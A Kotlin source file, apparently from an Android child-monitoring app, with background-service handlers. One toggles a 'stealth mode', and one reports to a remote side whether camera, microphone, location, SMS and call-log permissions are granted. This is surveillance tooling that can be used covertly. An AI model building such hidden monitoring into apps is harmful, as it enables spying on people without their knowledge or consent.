package com.soumo.child.commands

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Permission handler implementation for BackgroundService
 * Note: BackgroundService cannot request permissions directly, so this just logs
 */
class BackgroundServicePermissionHandler() : PermissionHandler {
    override fun requestPermission(permission: String, requestCode: Int, featureName: String) {
        // BackgroundService cannot request permissions directly
        Log.w("BackgroundServicePermissionHandler", "Cannot request permission $permission in background service")
    }
}

/**
 * Extended stealth handler for BackgroundService that also handles PONG updates
 */
class BackgroundServiceExtendedStealthHandler(
    private val stealthActivated: AtomicBoolean,
    private val onActivate: (() -> Unit)? = null,
    private val onDeactivate: (() -> Unit)? = null
) : StealthHandler {
    override fun activateStealthMode() {
        try {
            onActivate?.invoke()
            stealthActivated.set(true)
            Log.d("BackgroundServiceExtendedStealthHandler", "Stealth mode activated")
        } catch (e: Exception) {
            Log.e("BackgroundServiceExtendedStealthHandler", "Failed to activate stealth mode", e)
        }
    }

    override fun deactivateStealthMode() {
        try {
            onDeactivate?.invoke()
            stealthActivated.set(false)
            Log.d("BackgroundServiceExtendedStealthHandler", "Stealth mode deactivated")
        } catch (e: Exception) {
            Log.e("BackgroundServiceExtendedStealthHandler", "Failed to deactivate stealth mode", e)
        }
    }
}

/**
 * Settings handler implementation for BackgroundService
 * Note: BackgroundService cannot open settings directly, so this just logs
 */
class BackgroundServiceSettingsHandler(private val context: Context, private val send: (String) -> Unit) : SettingsHandler {
    override fun openAppSettings() {
        // BackgroundService cannot open settings directly
        Log.w("BackgroundServiceSettingsHandler", "Cannot open app settings from background service")
    }

    override fun checkPermissionStatus() {
        val permissions = mapOf(
            "CAMERA" to Manifest.permission.CAMERA,
            "MICROPHONE" to Manifest.permission.RECORD_AUDIO,
            "LOCATION" to Manifest.permission.ACCESS_FINE_LOCATION,
            "SMS" to Manifest.permission.READ_SMS,
            "CALL_LOG" to Manifest.permission.READ_CALL_LOG
        )

        val status = permissions.map { (name, permission) ->
            val granted = ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
            "$name:${if (granted) "GRANTED" else "DENIED"}"
        }.joinToString("|")

        send("PERMISSION_STATUS:$status")
        Log.d("BackgroundServiceSettingsHandler", "Permission status: $status")
    }

    override fun requestAllPermissions() {
        // BackgroundService cannot request permissions directly
        Log.w("BackgroundServiceSettingsHandler", "Cannot request all permissions from background service")
    }

    override fun showPermissionSettingsDialog(featureName: String) {
        // BackgroundService cannot show dialogs directly
        Log.w("BackgroundServiceSettingsHandler", "Cannot show permission settings dialog from background service")
    }
}
